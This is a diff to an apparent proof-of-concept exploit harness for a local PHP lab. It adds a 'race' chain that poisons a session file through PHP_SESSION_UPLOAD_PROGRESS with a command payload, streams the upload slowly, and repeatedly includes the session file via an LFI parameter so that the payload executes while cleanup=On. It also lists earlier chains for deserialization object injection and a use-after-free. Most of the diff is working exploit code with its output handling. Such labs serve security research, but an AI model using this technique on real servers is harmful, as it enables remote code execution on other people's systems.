@@ -6,6 +6,8 @@ templates/ into lab/ (gitignored, regenerated with --regen).
 
 Chains:
   rce       session fixation + filename injection -> LFI include -> command exec
+  race      same poison, but the include fires while the upload is still
+            streaming: works with the stock session.upload_progress.cleanup=On
   mismatch  php_serialize writer + php reader -> injected object instantiated
             (proven by a __destruct marker file inside the php container)
   uaf       unserialize() var_destroy/__destruct reentry read-after-free,
@@ -18,6 +20,7 @@ from __future__ import annotations
 
 import argparse
 import base64
+import contextlib
 import hashlib
 import http.client
 import logging
@@ -25,8 +28,11 @@ import os
 import re
 import secrets
 import shutil
+import socket
 import subprocess
 import sys
+import threading
+import time
 import urllib.parse
 from pathlib import Path
 from string import Template
@@ -353,6 +359,139 @@ def chain_rce(cmd: str, sid: str, http_port: int) -> int:
     return 1
 
 
+def build_stream_parts(filename: str, sid: str, size: int) -> tuple[bytes, bytes, int, str]:
+    """Multipart head/tail plus total length for a body of ``size`` filler bytes."""
+    boundary = secrets.token_hex(16)
+    head = (
+        f'--{boundary}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
+        f"--{boundary}\r\nContent-Disposition: form-data; "
+        f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
+        f"--{boundary}\r\nContent-Disposition: form-data; "
+        f'name="f"; filename="{_param(filename)}"\r\n'
+        "Content-Type: application/octet-stream\r\n\r\n"
+    ).encode()
+    tail = f"\r\n--{boundary}--\r\n".encode()
+    return head, tail, len(head) + size + len(tail), boundary
+
+
+def set_lab_cleanup(value: str) -> str:
+    """Rewrite lab/php.ini's upload_progress.cleanup and return the old content."""
+    ini = LAB / "php.ini"
+    original = ini.read_text(encoding="utf-8")
+    updated = re.sub(
+        r"(?m)^session\.upload_progress\.cleanup\s*=.*$",
+        f"session.upload_progress.cleanup = {value}",
+        original,
+    )
+    if updated == original:
+        raise LabError("lab/php.ini has no session.upload_progress.cleanup line")
+    ini.write_text(updated, encoding="utf-8")
+    return original
+
+
+def chain_race(
+    cmd: str,
+    sid: str,
+    http_port: int,
+    size: int,
+    timeout: float,
+    stock_cleanup: bool,
+) -> int:
+    """Poison and include concurrently; the hit must land while bytes are in flight."""
+    if not 64 * 1024 <= size <= 7 * 1024 * 1024:
+        raise LabError("--size must be 64KiB..7MiB (PHP post_max_size defaults to 8M)")
+
+    payload = build_rce_payload(cmd)
+    original_ini: str | None = None
+    if stock_cleanup:
+        original_ini = set_lab_cleanup("On")
+        log.info("restarting php with session.upload_progress.cleanup=On (stock default)")
+        compose(
+            "up", "-d", "--wait", "--wait-timeout", "120", "--force-recreate", "php", timeout=180
+        )
+    try:
+        head, tail, total, boundary = build_stream_parts(payload, sid, size)
+        state: dict[str, object] = {"sent": len(head), "done": False, "error": None}
+
+        def upload() -> None:
+            try:
+                sock = socket.create_connection((HOST, http_port), timeout=60)
+                try:
+                    preamble = (
+                        "POST /app/upload.php HTTP/1.1\r\n"
+                        f"Host: {HOST}:{http_port}\r\n"
+                        f"Cookie: PHPSESSID={sid}\r\n"
+                        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
+                        f"Content-Length: {total}\r\n"
+                        "Connection: close\r\n\r\n"
+                    ).encode()
+                    sock.sendall(preamble + head)
+                    filler = b"A" * 65536
+                    end = len(head) + size
+                    while state["sent"] < end:  # type: ignore[operator]
+                        n = min(len(filler), end - state["sent"])  # type: ignore[operator]
+                        sock.sendall(filler[:n])
+                        state["sent"] = state["sent"] + n  # type: ignore[operator]
+                        time.sleep(0.02)
+                    sock.sendall(tail)
+                    state["sent"] = total
+                    with contextlib.suppress(OSError):
+                        sock.recv(65536)
+                finally:
+                    sock.close()
+            except OSError as exc:
+                state["error"] = str(exc)
+            finally:
+                state["done"] = True
+
+        thread = threading.Thread(target=upload, daemon=True)
+        thread.start()
+
+        page = urllib.parse.quote(f"{SESSIONS}/sess_{sid}", safe="/")
+        deadline = time.time() + timeout
+        probes = 0
+        while time.time() < deadline:
+            status, raw = get(http_port, f"/vuln.php?page={page}")
+            probes += 1
+            if b"POC-OUT[" in raw:
+                sent = int(state["sent"])  # type: ignore[arg-type]
+                out = raw.split(b"POC-OUT[", 1)[1].split(b"]POC-OUT", 1)[0]
+                print(f"[+] payload executed from the session file, cmd={cmd!r}:")
+                print(out.decode("utf-8", "replace").rstrip())
+                if sent < total:
+                    print(f"    in flight: {sent}/{total} bytes sent, {probes} probes")
+                    print("    -> the include won the race; cleanup=On does not stop it")
+                else:
+                    print(f"    after the upload ended ({probes} probes); cleanup is Off here")
+                return 0
+            if state["done"] and state["error"]:
+                break
+            time.sleep(0.05)
+        thread.join(timeout=5)
+        if state["error"]:
+            print(f"[-] upload failed: {state['error']}")
+        else:
+            print(
+                f"[-] no execution within {timeout:.0f}s "
+                f"({probes} probes, {state['sent']}/{total} bytes sent)"
+            )
+        return 1
+    finally:
+        if original_ini is not None:
+            (LAB / "php.ini").write_text(original_ini, encoding="utf-8")
+            compose(
+                "up",
+                "-d",
+                "--wait",
+                "--wait-timeout",
+                "120",
+                "--force-recreate",
+                "php",
+                check=False,
+                timeout=180,
+            )
+
+
 def chain_mismatch(klass: str, sid: str, http_port: int) -> int:
     exec_php("rm", "-f", GADGET_MARKER)
     injection = build_injection(klass)
@@ -460,6 +599,19 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--cmd", default="id", help="command to run inside the php container")
     p.add_argument("--sid", default="poc26rce0000000000000000")
 
+    p = sub.add_parser("race", help="chain 1b: poison + include while the upload is in flight")
+    p.add_argument("--cmd", default="id", help="command to run inside the php container")
+    p.add_argument("--sid", default="poc26race000000000000000")
+    p.add_argument(
+        "--size", type=int, default=4 * 1024 * 1024, help="upload body bytes (64KiB..7MiB)"
+    )
+    p.add_argument("--timeout", type=float, default=60, help="seconds to keep probing")
+    p.add_argument(
+        "--stock-cleanup",
+        action="store_true",
+        help="temporarily set session.upload_progress.cleanup=On (stock default) and restore after",
+    )
+
     p = sub.add_parser("mismatch", help="chain 2: handler mismatch -> object instantiation")
     p.add_argument(
         "--class",
@@ -495,6 +647,15 @@ def main(argv: list[str] | None = None) -> int:
         require_running()
         if args.action == "rce":
             return chain_rce(args.cmd, validate_sid(args.sid), port)
+        if args.action == "race":
+            return chain_race(
+                args.cmd,
+                validate_sid(args.sid),
+                port,
+                args.size,
+                args.timeout,
+                args.stock_cleanup,
+            )
         if args.action == "mismatch":
             return chain_mismatch(validate_class(args.klass), validate_sid(args.sid), port)
         if args.action == "uaf":
